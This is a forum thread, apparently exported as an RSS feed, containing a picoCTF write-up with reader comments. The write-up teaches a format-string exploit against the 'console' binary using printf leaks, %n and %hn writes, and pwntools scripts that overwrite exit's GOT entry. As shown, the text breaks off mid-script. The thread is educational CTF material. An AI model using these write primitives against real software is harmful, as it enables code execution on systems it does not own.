+[&lt;img src=&#39;//0x00sec.s3.amazonaws.com/original/2X/3/35ec3869bcc27dac17fb569e517312660a570255.png&#39; alt=&#39;asciicast&#39;&gt;](https://asciinema.org/a/9rxph86dcsgvxrvtivadt8vgx)
+
+---
+
+###Conclusion
+
+That&#39;s been it folks. I hope I didn&#39;t waste your time. If you feel puzzled, don&#39;t get discouraged, just re-read it a couple of times and research the same topic on google. After reading plenty of examples and implementing one of your own, you&#39;ll be 1337. By the way, the task was a remote one, but the server was kinda slow when the CTF ended so I implemented it locally. The only change that you&#39;d have to make is adjust the libc offsets, which is quite trivial since the libc was provided.
+
+Thank you for taking the time to read my write-up. Feedback is always welcome and much appreciated. If you have any questions, I&#39;d love to help you out if I can. Finally, if you spot any errors in terms of code/syntax/grammar, please let me know. I&#39;ll be looking out for mistakes as well.
+ 
+You can find my exploit and the binary (source code, libc included) [here](https://github.com/0x0py/picoCTF).
+
+Peace out,
+@_py</description>
+    
+    <lastBuildDate>Thu, 20 Jul 2017 15:47:01 +0000</lastBuildDate>
+    <category>Exploit Development</category>
+    <atom:link href="https://d.clarkee.co.uk/t/picoctf-write-up-bypassing-aslr-via-format-string-bug/1920.rss" rel="self" type="application/rss+xml" />
+      <item>
+        <title>picoCTF Write-up ~ Bypassing ASLR via Format String Bug</title>
+        <dc:creator><![CDATA[_py]]></dc:creator>
+        <description><![CDATA[
+            
+          <p><a href="https://d.clarkee.co.uk/t/picoctf-write-up-bypassing-aslr-via-format-string-bug/1920/11">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/picoctf-write-up-bypassing-aslr-via-format-string-bug/1920/11</link>
+        <pubDate>Tue, 09 Jan 2018 11:27:03 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-1920-11</guid>
+        <source url="https://d.clarkee.co.uk/t/picoctf-write-up-bypassing-aslr-via-format-string-bug/1920.rss">picoCTF Write-up ~ Bypassing ASLR via Format String Bug</source>
+      </item>
+      <item>
+        <title>picoCTF Write-up ~ Bypassing ASLR via Format String Bug</title>
+        <dc:creator><![CDATA[neolex]]></dc:creator>
+        <description><![CDATA[
+            <aside class="quote no-group" data-username="_py" data-post="8" data-topic="1920">
+<div class="title">
+<div class="quote-controls"></div>
+<img alt="" width="24" height="24" src="https://d.clarkee.co.uk/user_avatar/d.clarkee.co.uk/_py/48/4275_2.png" class="avatar"> _py:</div>
+<blockquote>
+<p>You need the binary’s libc one way or another. You could leak the whole binary’s address space, or use the libc-database which LiveOverflow is using for his task. But, if the libc is provided, which is the case with this one, it’s wise to use that one.</p>
+</blockquote>
+</aside>
+<p>Thank you for your reponse, on the website of picoctf i dont find the libc but we have a ssh access so I got the libc offset on the ssh server <img src="https://d.clarkee.co.uk/images/emoji/twitter/slight_smile.png?v=15" title=":slight_smile:" class="emoji" alt=":slight_smile:" loading="lazy" width="20" height="20"></p>
+          <p><a href="https://d.clarkee.co.uk/t/picoctf-write-up-bypassing-aslr-via-format-string-bug/1920/9">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/picoctf-write-up-bypassing-aslr-via-format-string-bug/1920/9</link>
+        <pubDate>Tue, 13 Jun 2017 11:23:44 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-1920-9</guid>
+        <source url="https://d.clarkee.co.uk/t/picoctf-write-up-bypassing-aslr-via-format-string-bug/1920.rss">picoCTF Write-up ~ Bypassing ASLR via Format String Bug</source>
+      </item>
+      <item>
+        <title>picoCTF Write-up ~ Bypassing ASLR via Format String Bug</title>
+        <dc:creator><![CDATA[_py]]></dc:creator>
+        <description><![CDATA[
+            <p>The libc for the binary is provided. I hope you understand why it’s essential.</p>
+<p>Check out this <a href="https://www.youtube.com/watch?v=XuzuFUGuQv0" rel="nofollow noopener">video</a> as well. You need the binary’s libc one way or another. You could leak the whole binary’s address space, or use the libc-database which LiveOverflow is using for his task. But, if the libc is provided, which is the case with this one, it’s wise to use that one.</p>
+          <p><a href="https://d.clarkee.co.uk/t/picoctf-write-up-bypassing-aslr-via-format-string-bug/1920/8">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/picoctf-write-up-bypassing-aslr-via-format-string-bug/1920/8</link>
+        <pubDate>Tue, 13 Jun 2017 05:05:05 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-1920-8</guid>
+        <source url="https://d.clarkee.co.uk/t/picoctf-write-up-bypassing-aslr-via-format-string-bug/1920.rss">picoCTF Write-up ~ Bypassing ASLR via Format String Bug</source>
+      </item>
+      <item>
+        <title>picoCTF Write-up ~ Bypassing ASLR via Format String Bug</title>
+        <dc:creator><![CDATA[neolex]]></dc:creator>
+        <description><![CDATA[
+            <p>Hi,<br>
+I’m on this challenge and I managed to make it works on my system but the offset on my system seems wrong in the remote server…<br>
+How can we find the offset without the libc.so ?</p>
+          <p><a href="https://d.clarkee.co.uk/t/picoctf-write-up-bypassing-aslr-via-format-string-bug/1920/7">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/picoctf-write-up-bypassing-aslr-via-format-string-bug/1920/7</link>
+        <pubDate>Tue, 13 Jun 2017 01:34:43 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-1920-7</guid>
+        <source url="https://d.clarkee.co.uk/t/picoctf-write-up-bypassing-aslr-via-format-string-bug/1920.rss">picoCTF Write-up ~ Bypassing ASLR via Format String Bug</source>
+      </item>
+      <item>
+        <title>picoCTF Write-up ~ Bypassing ASLR via Format String Bug</title>
+        <dc:creator><![CDATA[_py]]></dc:creator>
+        <description><![CDATA[
+            <p>Thank you so much for the feedback! I’ll try to fix (if possible) the asciinema font. I thought it’d be more comprehensive if I show the exploitation process through vids and not having to explain every bit of an image. I can add screenshots as well if something was unclear to you.</p>
+<p>If you have any other recommendation in terms of ways to illustrate the steps better, please let me know.</p>
+<p>Cheers!</p>
+          <p><a href="https://d.clarkee.co.uk/t/picoctf-write-up-bypassing-aslr-via-format-string-bug/1920/6">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/picoctf-write-up-bypassing-aslr-via-format-string-bug/1920/6</link>
+        <pubDate>Wed, 03 May 2017 15:49:17 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-1920-6</guid>
+        <source url="https://d.clarkee.co.uk/t/picoctf-write-up-bypassing-aslr-via-format-string-bug/1920.rss">picoCTF Write-up ~ Bypassing ASLR via Format String Bug</source>
+      </item>
+      <item>
+        <title>picoCTF Write-up ~ Bypassing ASLR via Format String Bug</title>
+        <dc:creator><![CDATA[sagittarius-a]]></dc:creator>
+        <description><![CDATA[
+            <p>Long story short. That is a <strong>fantastic</strong> writeup about format strings vulnerabilities. Asciinema is pretty cool, this way we can see it live. Some people do prefer to have a live demo instead of screenshots. May be you could increase font size in asciinemas for four eyed people like me 8D</p>
+<p>Stackframes, GDB, pwnlib script… Nothing’s missing. Thank you.</p>
+          <p><a href="https://d.clarkee.co.uk/t/picoctf-write-up-bypassing-aslr-via-format-string-bug/1920/5">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/picoctf-write-up-bypassing-aslr-via-format-string-bug/1920/5</link>
+        <pubDate>Wed, 03 May 2017 13:38:08 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-1920-5</guid>
+        <source url="https://d.clarkee.co.uk/t/picoctf-write-up-bypassing-aslr-via-format-string-bug/1920.rss">picoCTF Write-up ~ Bypassing ASLR via Format String Bug</source>
+      </item>
+      <item>
+        <title>picoCTF Write-up ~ Bypassing ASLR via Format String Bug</title>
+        <dc:creator><![CDATA[IoTh1nkN0t]]></dc:creator>
+        <description><![CDATA[
+            <p><img src="//0x00sec.s3.amazonaws.com/original/2X/7/7c13696275e898780210ab85bcfa8e263def8ff7.jpg" width="424" height="500"></p>
+<p>Holy shit dude this is awesome!!! &lt;3</p>
+          <p><a href="https://d.clarkee.co.uk/t/picoctf-write-up-bypassing-aslr-via-format-string-bug/1920/4">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/picoctf-write-up-bypassing-aslr-via-format-string-bug/1920/4</link>
+        <pubDate>Sun, 23 Apr 2017 15:14:42 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-1920-4</guid>
+        <source url="https://d.clarkee.co.uk/t/picoctf-write-up-bypassing-aslr-via-format-string-bug/1920.rss">picoCTF Write-up ~ Bypassing ASLR via Format String Bug</source>
+      </item>
+      <item>
+        <title>picoCTF Write-up ~ Bypassing ASLR via Format String Bug</title>
+        <dc:creator><![CDATA[exploit]]></dc:creator>
+        <description><![CDATA[
+            <p>Great writeup, keep going ^.^</p>
+          <p><a href="https://d.clarkee.co.uk/t/picoctf-write-up-bypassing-aslr-via-format-string-bug/1920/3">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/picoctf-write-up-bypassing-aslr-via-format-string-bug/1920/3</link>
+        <pubDate>Sun, 23 Apr 2017 14:36:27 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-1920-3</guid>
+        <source url="https://d.clarkee.co.uk/t/picoctf-write-up-bypassing-aslr-via-format-string-bug/1920.rss">picoCTF Write-up ~ Bypassing ASLR via Format String Bug</source>
+      </item>
+      <item>
+        <title>picoCTF Write-up ~ Bypassing ASLR via Format String Bug</title>
+        <dc:creator><![CDATA[_py]]></dc:creator>
+        <description><![CDATA[
+            <p>Hello folks! I hope you’re all doing great. After a disgusting amount of trial and error, I present to you my solution for the <em>console</em> pwnable. Unfortunately, I did not solve the task on time but it was fun nevertheless. I decided to use this challenge as a way to introduce to you one of the ways you can bypass ASLR.</p>
+<p>If you have never messed with basic pwning i.e stack/buffer overflows, this write-up might not be your cup of tea. It’ll be quite technical. Firstly I’ll bombard you with theory and then we will move to the actual PoC/exploit, aka the all-time classic <a class="mention" href="https://d.clarkee.co.uk/u/_py">@_py</a> way of explaining stuff.</p>
+<p>Let’s dive right into, shall we?</p>
+<hr>
+<p>##<span class="hashtag">#Code</span> Auditing</p>
+<p>Though the source code was provided (you can find a link to at the bottom of the write-up), you could easily spot the bug just by reading the disassembly. Since some of you might not be experienced with Reverse Engineering, below are the important parts of code:</p>
+<pre><code class="lang-python">[...]
+
+void set_exit_message(char *message) {
+    if (!message) {
+        printf("No message chosen\n");
+        exit(1);
+    }
+    printf("Exit message set!\n");
+    printf(message);  
+
+    append_command('e', message);
+    exit(0);
+}
+
+void set_prompt(char *prompt) {
+    if (!prompt) {
+        printf("No prompt chosen\n");
+        exit(1);
+    }
+    if (strlen(prompt) &gt; 10) {
+        printf("Prompt too long\n");
+        exit(1);
+    }
+    printf("Login prompt set to: %10s\n", prompt);
+
+    append_command('p', prompt);
+    exit(0);
+}
+
+[...]
+
+void loop() {
+    char buf[1024];
+    while (true) {
+        printf("Config action: ");
+        char *result = fgets(buf, 1024, stdin);
+        if (!result) exit(1);
+        char *type = strtok(result, " ");
+        if (type == NULL) {
+            continue;
+        }
+        char *arg = strtok(NULL, "\n");
+        switch (type[0]) {
+        case 'l':
+            set_login_message(arg);
+            break;
+        case 'e':
+            set_exit_message(arg);
+            break;
+        case 'p':
+            set_prompt(arg);
+            break;
+        default:
+            printf("Command unrecognized.\n");
+            /* Fallthrough */
+        case 'h':
+            print_help();
+            break;
+        }
+    }
+}
+
+[...]
+
+</code></pre>
+<p>Here is the bug:</p>
+<pre><code class="lang-python">void set_exit_message(char *message) {
+             [...]
+    printf("Exit message set!\n");
+    printf(message);
+
+    append_command('e', message);
+    exit(0);
+}
+</code></pre>
+<p>Cute, we’ve got control over <strong>printf</strong>! For those who do not understand why this is a bug, let me give you a brief rundown. To be honest, there are a bunch of resources on how format string attacks work, but since I’m making the effort to explain the exploit, it’d feel incomplete not to explain the theory behind it. I hope you know the basics of the stack at least, otherwise the following will not make much sense.</p>
+<hr>
+<p>##<span class="hashtag">#Printf</span> &amp; Stack Analysis</p>
+<pre><code class="lang-makefile">                        +------------+
+                        |            |
+                        |     ...    |
+                        |   8th arg  |
+                        +------------+
+                        |   7th arg  |
+                        +------------+
+                        |   ret addr |
+                        +------------+
+                        |     ...    |
+                        | local vars |
+                        |     ...    |
+                        +------------+
+</code></pre>
+<p>Now you might be asking yourselves, “what’s up with the 7th and 8th argument in the ascii art?”. Well, we are dealing with a 64-bit ELF binary. Meaning, as far as the function calling convention is concerned, the ABI states the following(simplified):</p>
+<hr>
+<h2><em>The first 6 integer or pointer arguments to a function are passed in registers. The first is placed in rdi, the second in rsi, the third in rdx, and then rcx, r8 and r9. Only the 7th argument and onwards are passed on the stack.</em></h2>
+<p>Interesting. Let’s enter the h4x0r mode and brainstorm a little bit. By typing <strong><em>man 3 printf</em></strong> we get the following intel:</p>
+<pre><code class="lang-makefile">#include &lt;stdio.h&gt;
+
+       int printf(const char *format, ...);
+</code></pre>
+<p>So printf receives “2” arguments:</p>
+<ul>
+<li>The string format i.e “%d %x %s”.</li>
+<li>A variable number of arguments.</li>
+</ul>
+<p>Ok that sounds cool and all, but how can we exploit this? The key in exploit development and in hacking overall, is being able to <strong>see through the abstraction</strong>. Let me explain myself further.</p>
+<p>Let’s assume we have the following code:</p>
+<pre><code class="lang-auto">[...]
+1. int32_t num = 6;
+2. printf("%d", num);
+[...]
+</code></pre>
+<p>Here’s the pseudo-assembly for it:</p>
+<pre><code class="lang-auto">1. mov [rbp - offset], 0x6
+2. mov rsi, [rbp - offset]
+3. mov rdi, "%d"
+4. call printf
+</code></pre>
+<p>Our format specifier includes “%d”. What this whispers into printf’s ear is “yo printf, you are about to get called with one format specifier, %d to be precise. According to the ABI, expect the argument to be in rdi, ok?” Then, printf will read the content of rdi and print the number 6 to stdout. Do you see where this is going? No? Alright, one more example.</p>
+<pre><code class="lang-auto">[...]
+1. int32_t num = 6;
+2. printf("%d %d %d %d");
+[...]
+</code></pre>
+<pre><code class="lang-auto">1. mov [rbp - offset], 0x6
+2.    ???
+3. call printf
+</code></pre>
+<p>In case you didn’t notice, I changed the format string and the number of arguments being passed to printf. “What will this whisper into printf’s ear?” you ask. Well, “yo printf, you are about to get called with 4 format specifiers, 4 %d’s to be precise. According to the ABI, expect the arguments to be in rdi, rsi and so on, ok?” Now what’s going to happen in this case? Has anything practically changed?</p>
+<p>Ofcourse not! Printf is dumb, all it knows is the format specifier. It “trusts” us, the user/program about the content of rdi, rsi etc. As I’ve stated before, we had control over printf. Control over its format specifier argument to be exact. That’s really powerful! Why?</p>
+<p><a href="https://asciinema.org/a/4ydrob1b7b6nmzupx883axyxr" rel="noopener nofollow ugc"><img src="//0x00sec.s3.amazonaws.com/original/2X/0/0a38ae0a255f4f0810ad7789101ea34d00257188.png" alt="asciicast"></a></p>
+<p>The above clip is a demo of the vulnerable CTF task. If you read the source code real quick (shouldn’t take more than 5 mins to understand what it does), you’d realize that <strong>set_exit_message</strong> essentially receives as an argument whatever we place next to ‘e’ (e stands for exit). Afterwards, it calls printf with that argument. So what gives?</p>
+<p>The format string we provided, instructed printf to print its 8 byte integer “arguments” as pointers (%p expects a pointer). The values printed are values that printf finds at the locations it would normally expect arguments. Because printf actually gets one real argument, namely the pointer to buf (passed in %rdi), it will expect the next 5 arguments within the remaining registers and everything else on the stack. That’s the case with our binary as well! We managed to leak memory!</p>
+<p>And the best part? We actually read values “above” <strong>set_exit_message’s</strong> stack frame! Take a good look at the printf output. Does <strong>0x400aa6</strong> ring a bell? Looks like a text segment address. That’s the return address in <strong>set_exit_message’s</strong> stack frame, aka a loop’s instruction address!</p>
+<p><img src="//0x00sec.s3.amazonaws.com/original/2X/d/d50700cf5d356d850c109897c98aa172705002b7.png" width="315" height="38"></p>
+<p>Moreover, did you notice the <strong>0x7025207025207025</strong> value? Since the architecture is little-endian, converting the hex values to characters, we get the following:</p>
+<pre><code class="lang-makefile">0x25 -&gt; '%'
+0x70 -&gt; 'p'
+0x20 -&gt; ' '
+</code></pre>
+<p>Holy moly! We leaked <strong>main’s</strong> stack frame! But more importantly, our own input! That’s the so called <strong>read primitive</strong>, which basically means we get to read whatever value we want, either in registers, stack or even our own input. You’ll see how crucial that is in the exploitation segment.</p>
+<p>Do you understand now what I mean by seeing through the abstraction? We managed to exploit a simple assumption that computer scientists took for granted.</p>
+<hr>
+<p>Phew, alrigthy, I hope I made sense folks. Let’s slowly move on to the exploitation part. First of all, this is a pwnable task, which means we need to get a shell (root privs) in order to be able to  read the <em>flag</em> text file. Hmm, how can we tackle the task knowing that we have a read primitive? Let’s construct a plan:</p>
+<ul>
+<li>
+<p>We managed to read values off of registers and the stack, aka read primitive.</p>
+</li>
+<li>
+<p>We can take advantage of that and read certain values that will be useful to us, such as libc’s base address. If we manage to leak libc’s address, we can calculate addresses of other “pwnable” functions such as <strong>execve</strong> or <strong>system</strong>, and get a shell. Note, I say “leak”, because ASLR is activated. Thus, in every execution the libc will have a different base address. Otherwise, if ASLR was off, its address would be hardcoded and our life would be much easier. Libc’s functions are a constant offset away from libc’s base address so we won’t have an issue leaking them once we get the base address.</p>
+</li>
+<li>
+<p>Alright, we can leak libc’s functions, and then what? Let’s pause our plan for a while.</p>
+</li>
+</ul>
+<p><em>(</em><strong><em>Note:</em></strong> <em>Though dynamic linking is not a prerequisite to understand the high level view of the exploit, knowing its internals will give you a much better insight of the nitty-gritty details of the exploitation process. I have made quite a detailed write-up on Dynamic Linking internals which can be found <a href="https://0x00sec.org/t/linux-internals-the-art-of-symbol-resolution/1488">here</a>).</em></p>
+<hr>
+<p>##<span class="hashtag">#The</span> Dark Side Of Printf</p>
+<p>We saw that we have an arbitrary read through the format string bug. But that’s not enough. Wouldn’t be awesome if we could somehow not only <strong>read</strong> values but also <strong>write</strong>?</p>
+<p>Enter the dark zone folks:</p>
+<hr>
+<ul>
+<li><em>%n specifier</em></li>
+</ul>
+<p>If you are not into pwning or programming in C you have probably never seen the “%n” specifier. %n is the gold mine for format string attacks. Using this stackoverflow <a href="http://stackoverflow.com/questions/3401156/what-is-the-use-of-the-n-format-specifier-in-c" rel="noopener nofollow ugc">link</a> as a reference, I’ll explain what %n is capable of.</p>
+<pre><code class="lang-python">#include &lt;stdio.h&gt;
+
+int main()
+{
+  int val;
+
+  printf("blah %n blah\n", &amp;val);
+
+  printf("val = %d\n", val);
+
+  return 0;
+
+}
+</code></pre>
+<p>Output:</p>
+<pre><code class="lang-makefile">blah  blah
+val = 5
+</code></pre>
+<p>Simply put, it stores the amount of characters printed on the screen to a variable (providing its address).</p>
+<p>Sweet, now we have a <strong>write primitive</strong> as well! How can we take advantage of that? Since we have an arbitrary write, we can write anything we want to wherever we want (you’ll see how shortly). Let’s resume our plan:</p>
+<ul>
+<li>
+<p>We can overwrite any address with a value that makes our life easier.</p>
+</li>
+<li>
+<p>We could overwrite a function’s address with system’s and game over!</p>
+</li>
+<li>
+<p>Nope, not that easily at least. Looking at the source, we can see that after printf is called, exit() is called. This is a bummer, since our plan does not only require an arbitrary write, but an arbitrary read as well. We can’t just leak libc’s base address AND overwrite a function through the same format string. We need to do it in separate steps. But how? Exit() will terminate the program.</p>
+</li>
+<li>
+<p>Unless, we overwrite exit’s address with something else! Hmm, that’s indeed a pretty neat idea. But with what?</p>
+</li>
+<li>
+<p>What about loop’s address?! That sounds like an awesome plan! We can overwrite exit’s address with loop’s, leading to the binary never exiting! That way, we can endlessly enter our bogus input and read/write values with no rush.</p>
+</li>
+</ul>
+<hr>
+<ul>
+<li>%[width] modifier</li>
+</ul>
+<p>Another dark wizardry of printf is the following code:</p>
+<pre><code class="lang-python">[...]
+printf("Output:");
+printf("%100x", 6);
+[...]
+</code></pre>
+<p>Terminal:</p>
+<pre><code class="lang-makefile">&gt; ./demo
+Output:                                         6
+</code></pre>
+<p>6 is padded to a size of 100 bytes long. In other words, with the [modifier] part we can instruct printf to print whatever amount of bytes we want. Why is that useful though? Imagine having to write the value 0x1337 to a variable using the %n specifier (keep in mind that function addresses vary from 0x400000 all the way to 0x7fe5b94126a3. That trick will be really helpful to us.). Trying to actually type 0x1337 character by hands is tedious and a waste of time. The above modifier gets the job done easier.</p>
+<hr>
+<ul>
+<li>%[number]$ specifier</li>
+</ul>
+<p>The last trick we’ll be using is the $[number] specifier which helps us refer to certain stack offsets and what not. Demo time:</p>
+<p><a href="https://asciinema.org/a/ef1fcjmmmvvwuhbgoe2jmgha4" rel="noopener nofollow ugc"><img src="//0x00sec.s3.amazonaws.com/original/2X/7/7716a3e9263ab8559756b0c4af3bfeca358c670a.png" alt="asciicast"></a></p>
+<p>Scroll up to the demo where I showed you the bug in action through the %p specifier. If you count the values that are printed, you will notice that <strong>0x400aa6</strong> is the 9th value. By entering %9$p as I showed above, we can refer to it directly. Imagine replacing ‘p’, with ‘n’. What would have happened? In a different case, it would crash because 0x400aa6 would be overwritten with the amount of characters being printed (which would not be a valid instruction address). In our case, nothing should happen since exit() is called, which means we will never return back to loop().</p>
+<hr>
+<p>##<span class="hashtag">#Pwning</span> Time</p>
+<p>I know this might look like a lot to take in, but without the basics and theory, we are handicapped. Bare in mind, it took me around 3-5 days of straight research in order to get this to work. If you feel like it’s complicated, it’s not. You just need to re-read it a couple of times and play with the binary yourself in order to get a feel of it. Be patient, code is coming soon. It will all make sense (hopefully).</p>
+<p>Our plan starts making sense. First step is to overwrite exit’s address with loop’s. Luckily for us, the binary does not have full ASLR on. Meaning, the text segment which includes the machine code, and the Global Offset Table (refer to my Dynamic Linking write-up, I warned you), which includes function pointers to libc (and more), will have a hardcoded address.</p>
+<p>Now that we learnt all about the dark side of printf, it’s time to apply this knowledge onto the task.</p>
+<hr>
+<p>##<span class="hashtag">#Overwriting</span> exit</p>
+<p>In order to do that, we first need to place exit’s GOT entry in the format string. The reason for that is that since we have an arbitrary read/write:</p>
+<ol>
+<li>
+<p>We can place exit’s address in the format string (which will be stored on the stack).</p>
+</li>
+<li>
+<p>Use with the %$[number] specifier to refer to its offset.</p>
+</li>
+<li>
+<p>Use the %[number] modifier to pad whatever is already printed to a certain number.</p>
+</li>
+<li>
+<p>Use the %n specifier to write that certain number to exit’s address.</p>
+</li>
+</ol>
+<p>Let’s begin exploring with the terminal and soon we will move to python using <a href="https://github.com/Gallopsled/pwntools" rel="noopener nofollow ugc">pwntools</a>. By the way, not sure if you noticed it, but I decided to include more “live” footage this time than just screenshots. The concept can be confusing so I’ll do my best to be as thorough as possible.</p>
+<p>Let the pwning begin:</p>
+<p><a href="https://asciinema.org/a/1nm7h6p8rpj9g889zd9g1bsg9" rel="noopener nofollow ugc"><img src="//0x00sec.s3.amazonaws.com/original/2X/a/a6b0697428a7f087e20a4713e1e2a82208a0c115.png" alt="asciicast"></a></p>
+<p>At this point I’d like to thank <a class="mention" href="https://d.clarkee.co.uk/u/exploit">@exploit</a> who reminded me of the stack alignment because I was stuck trying to figure out why the A’s were getting mixed up. Watch each demo carefully. If I feel there is a need to explain myself further I’ll add comments below the asciinema instance. You are more than welcome to ask me questions in the comments.</p>
+<p>Anyway, as shown in the demo, we begin our testing by entering A’s in our format string and then %p’s in order to print them out. We found out that they are the 15th value. Let’s try the %15$p trick this time.</p>
+<p><a href="https://asciinema.org/a/f2q1xs0yxwul35n1m2sostiq7" rel="noopener nofollow ugc"><img src="//0x00sec.s3.amazonaws.com/original/2X/6/6f513a4de96a736f845cfebc6a923b38664abc9b.png" alt="asciicast"></a></p>
+<p>Looking good so far. Let’s automate it in python so we won’t have to enter it every time.</p>
+<pre><code class="lang-python"># demo.py
+
+from pwn import *
+
+p = process(['./console', 'log'])
+pause()
+
+payload  = "exit".ljust(8)
+payload += "A"*8
+payload += "|%15$p|".rjust(8)
+
+p.sendline(payload)
+p.recvline()
+
+p.interactive()
+</code></pre>
+<p>Awesome, now we’ve got control over our input and we know its exact position. Let’s try with exit’s GOT entry this time, <strong>0x601258</strong>. Remember, we are dealing with 8-byte chunks so we need to pad the address to 8-bytes long:</p>
+<pre><code class="lang-python"># demo.py
+
+from pwn import *
+
+p = process(['./console', 'log'])
+pause()
+
+payload  = "exit".ljust(8)
+payload += p64(0x601258) # \x58\x12\x60\x00\x00\x00\x00\x00
+payload += "|%15$p|".rjust(8)
+
+p.sendline(payload)
+p.recvline()
+
+p.interactive()
+</code></pre>
+<p>Let’s see what it does in action.</p>
+<p><a href="https://asciinema.org/a/dzsospkt6eqt2fjsdfyxtfo48" rel="noopener nofollow ugc"><img src="//0x00sec.s3.amazonaws.com/original/2X/e/eeb8ef0ed2506ec41eac47ac62464f6b33d2f2fd.png" alt="asciicast"></a></p>
+<p>Hm, something is wrong here. Not only did we not get the address, but not even the “|…|” part. Why? Well, in case you didn’t know, <strong>printf will stop at a null-byte</strong>. Which makes sense! Exit’s GOT entry does have a null-byte. Meaning, printf will read up to ‘\x60’ and then it will stop. How can we fix that? Easy, we just move our address <strong>after</strong> the format specifier.</p>
+<pre><code class="lang-python">#demo.py
+
+from pwn import *
+
+EXIT_GOT = 0x601258
+
+p = process(['./console', 'log'])
+pause()
+
+payload  = "exit".ljust(8)
+payload += "|%16$p|".rjust(8)
+payload += p64(EXIT_GOT)
+
+p.sendline(payload)
+
+p.interactive()
+
+</code></pre>
+<p>Now our script should work. I’ve changed exit’s position in the string and updated ‘%15$p’ to ‘%16$p’. I’ll let you think about why I changed the specifier offset. After all this explanation it should be clear. Let’s run our script, shall we?</p>
+<p><a href="https://asciinema.org/a/92uk4lctooo3wv028b9vov97t" rel="noopener nofollow ugc"><img src="//0x00sec.s3.amazonaws.com/original/2X/6/6faa3c3d3b11d65e83914c0990ea4be038ce0b9c.png" alt="asciicast"></a></p>
+<p>Look at that, our address is there! Problem fixed. Unfortunately that’s the bummer with 64-bit addresses but when it comes to 32-bit ones, we wouldn’t have that issue. Either way, the fix was simple. Let’s recap:</p>
+<ul>
+<li>
+<p>We’ve managed to get control over our input.</p>
+</li>
+<li>
+<p>We placed exit’s address in the string.</p>
+</li>
+<li>
+<p>In doing so, we managed to find its offset.</p>
+</li>
+<li>
+<p>Knowing its offset we can use %offset$n to write to that address.</p>
+</li>
+</ul>
+<p>Thinking back to our plan, our goal is to overwrite exit’s address with loop()'s. I know beforehand that exit’s GOT entry points to <strong>0x400736</strong>. That’s because exit has not been called yet and thus it points to its PLT entry which has executable code to find exit’s address in libc. So what we want is this:</p>
+<pre><code class="lang-makefile">0x400736 =&gt; 0x4009bd
+</code></pre>
+<p>We don’t have to overwrite the whole address as you can see. Only its 2 lower bytes. Now I will demonstrate how %n can be used. You will notice that demo will be kinda slow. That’s because asciinema does not record 2 terminals at a time and I’ll be using two. One to run the binary and one to use gdb and attach to it. Updated script:</p>
+<pre><code class="lang-python">#demo.py
+
+from pwn import *
+
+EXIT_GOT = 0x601258
+
+p = process(['./console', 'log'])
+pause()
+
+payload  = "exit".ljust(8)
+payload += "|%17$n|".rjust(16)
+payload += p64(EXIT_GOT)
+
+p.sendline(payload)
+
+p.interactive()
+</code></pre>
+<p>First I will show what’s happening without the help of GDB and then I’ll fire it up.</p>
+<p><a href="https://asciinema.org/a/avz10dus19qnhtfhpn5avni1w" rel="noopener nofollow ugc"><img src="//0x00sec.s3.amazonaws.com/original/2X/b/be609965de4b68a04584f5402ad089b14343d884.png" alt="asciicast"></a></p>
+<p>We get a segfault, which makes sense, right? We overwrote exit’s address with the amount of characters being printed, which is too little and thus not a legal address to jump to. Let’s see what GDB has to say about this.</p>
+<p><a href="https://asciinema.org/a/dh4d2ougg1c3pss78wxh4cwcl" rel="noopener nofollow ugc"><img src="//0x00sec.s3.amazonaws.com/original/2X/c/c395b3de3b24ae223a05014650acdd08316a64e8.png" alt="asciicast"></a></p>
+<p>As shown above, I attached to the running binary with GDB and pressed enter in my 2nd terminal to send the input. It’s pretty clear that exit’s address got overwritten.</p>
+<pre><code class="lang-makefile">0x400736 =&gt; 0x0000000d
+</code></pre>
+<p>This is definitely not what we want as the result, but we are getting there! We can use our printf magic tricks and make it work.</p>
+<ul>
+<li>%[number]</li>
+</ul>
+<p>In order to increase the number of bytes being printed.</p>
+<ul>
+<li>%hn specifier</li>
+</ul>
+<p>I didn’t mention it earlier, but it’s time to introduce you to yet another dark side of printf. With %hn we can overwrite the address <strong>partially</strong>. %hn has the ability to overwrite only the 2 bytes of our variable, exit’s address in our case. I said it earlier that we don’t need to overwrite the whole address, only its lower 2 bytes since the higher 2 bytes are the same. I know, I know, confusing, but hey, that’s why a demo is on its way!</p>
+<p>Updated script:</p>
+<pre><code class="lang-python">#demo.py
+
+from pwn import *
+
+EXIT_GOT = 0x601258
+
+p = process(['./console', 'log'])
+pause()
+
+payload  = "exit".ljust(8)
+payload += "|%17$hn|".rjust(16)
+payload += p64(EXIT_GOT)
+
+p.sendline(payload)
+
+p.interactive()
+</code></pre>
+<p><a href="https://asciinema.org/a/axjcv07pcy2b5ml8nth3dqr05" rel="noopener nofollow ugc"><img src="//0x00sec.s3.amazonaws.com/original/2X/0/09a83732323f38b55114e0658ec7dbb631f82b68.png" alt="asciicast"></a></p>
+<p>Bam! We went from <strong>0x0000000d</strong> to <strong>0x0040000c</strong>. Partial overwrite folks! Now let’s think carefully. We want <strong>0x09bd</strong> to be the 2 lower bytes. All we have to do is:</p>
+<ul>
+<li>Convert 0x09bd to decimal.</li>
+<li>Use that number in the form of %2493x. You will notice that the 2 lower bytes will be slightly off but we can adjust that as you’ll see soon. Let’s update our script:</li>
+</ul>
+<pre><code class="lang-python">#demo.py
+
+from pwn import *
+
+EXIT_GOT = 0x601258
+LOOP     = 0x4009bd
+
+p = process(['./console', 'log'])
+pause()
+
+payload  = "exit".ljust(8)
+payload += ("%%%du|%%17$hn|" % 2493).rjust(16)
